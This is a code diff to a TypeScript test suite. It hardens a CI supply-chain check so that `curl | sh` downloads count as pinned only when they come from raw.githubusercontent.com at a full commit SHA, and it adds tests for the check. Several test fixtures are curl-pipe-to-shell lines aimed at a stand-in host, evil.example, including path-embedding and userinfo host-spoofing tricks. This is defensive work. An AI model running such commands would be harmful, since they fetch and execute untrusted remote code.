@@ -94,6 +94,30 @@ function packagesOf(rest: string): string[] {
     .filter((token) => token !== '' && !token.startsWith('-'));
 }
 
+/**
+ * **Whether a `curl | bash` line downloads from a URL that names a commit.**
+ *
+ * The first version of this was one regex over the whole command line, and a regex over a command line cannot tell a
+ * host from a path segment: `https://evil.example/raw.githubusercontent.com/o/r/<sha>/x.sh` contains the real host's
+ * name and is served by a name this repository does not control. `URL` parses the authority, so `hostname` is the host
+ * and nothing else - including for the userinfo form, where the raw host sits *before* the `@` and the authority after
+ * it is the one that answers. The pathname then has to be `/owner/repo/<sha>/...`: a branch is a name somebody moves.
+ */
+function downloadIsPinnedToACommit(text: string): boolean {
+  for (const token of text.split(/[\s"'`()|;]+/)) {
+    if (!token.startsWith('https://')) continue;
+    let url: URL;
+    try {
+      url = new URL(token);
+    } catch {
+      continue;
+    }
+    if (url.hostname !== 'raw.githubusercontent.com') continue;
+    if (/^[0-9a-f]{40}$/.test(url.pathname.split('/')[3] ?? '')) return true;
+  }
+  return false;
+}
+
 const INSTALLS = [...walk('.github/workflows', ['.yml', '.yaml']), ...walk('scripts', ['.sh'])];
 
 describe('every dependency this repository installs names what it installs', () => {
@@ -163,7 +187,7 @@ describe('every dependency this repository installs names what it installs', () 
         const pipe = /curl\s.*https:\/\/\S+\s*\|\s*(?:sudo -E )?(?:ba|z)?sh/.exec(entry.text);
         if (pipe === null) continue;
         // **The only form that can be verified from the URL alone**, and the one `PinnedDependencies` agrees with.
-        if (/raw\.githubusercontent\.com\/[^/]+\/[^/]+\/[0-9a-f]{40}\//.test(entry.text)) continue;
+        if (downloadIsPinnedToACommit(entry.text)) continue;
         if (DOWNLOAD_THEN_RUN_ALLOWED.some((allowed) => entry.text.includes(allowed.match)))
           continue;
         unlisted.push(`${path}:${entry.line} ${entry.text.trim()}`);
@@ -202,5 +226,53 @@ describe('every dependency this repository installs names what it installs', () 
       const found = INSTALLS.some((path) => readFileSync(path, 'utf8').includes(target));
       expect(found, `${target} is listed but nothing installs it`).toBe(true);
     }
+  });
+});
+
+/**
+ * **The check above trusts a host, so what it must not do is find that host inside somebody else's path.**
+ *
+ * The first version of this check was one regex, `/raw\.githubusercontent\.com\/.../`, and CodeQL opened
+ * `js/regex/missing-regexp-anchor` on it - correctly. The pattern reads the host as a substring of the whole command
+ * line, so a line that downloads from a name this repository does not control, with the real host's name as a path
+ * segment, satisfied the check that exists to reject exactly that. Every case below is a line the regex accepted.
+ */
+describe('a download is pinned by the host it reads, not by the text it contains', () => {
+  const SHA = 'e5b3c5834e3932c8aaa42deef4794076c9b0cbf0';
+
+  it('accepts the raw host when the third path segment is a commit sha', () => {
+    const line = `curl -fsSL https://raw.githubusercontent.com/o/r/${SHA}/install.sh | sh`;
+    expect(downloadIsPinnedToACommit(line)).toBe(true);
+  });
+
+  it('rejects a host that only carries the raw host inside its own path', () => {
+    const line = `curl -fsSL https://evil.example/raw.githubusercontent.com/o/r/${SHA}/install.sh | sh`;
+    expect(downloadIsPinnedToACommit(line)).toBe(false);
+  });
+
+  it('rejects a userinfo host that puts the raw host before the authority', () => {
+    const line = `curl -fsSL https://raw.githubusercontent.com@evil.example/r/${SHA}/install.sh | sh`;
+    expect(downloadIsPinnedToACommit(line)).toBe(false);
+  });
+
+  it('rejects the raw host when the segment names a branch', () => {
+    expect(
+      downloadIsPinnedToACommit(
+        'curl -fsSL https://raw.githubusercontent.com/o/r/main/install.sh | sh',
+      ),
+    ).toBe(false);
+  });
+
+  it('rejects a short revision that only looks like a sha', () => {
+    expect(
+      downloadIsPinnedToACommit(
+        'curl -fsSL https://raw.githubusercontent.com/o/r/e5b3c58/install.sh | sh',
+      ),
+    ).toBe(false);
+  });
+
+  it('rejects cleartext http even when the host and the sha are right', () => {
+    const line = `curl -fsSL http://raw.githubusercontent.com/o/r/${SHA}/install.sh | sh`;
+    expect(downloadIsPinnedToACommit(line)).toBe(false);
   });
 });
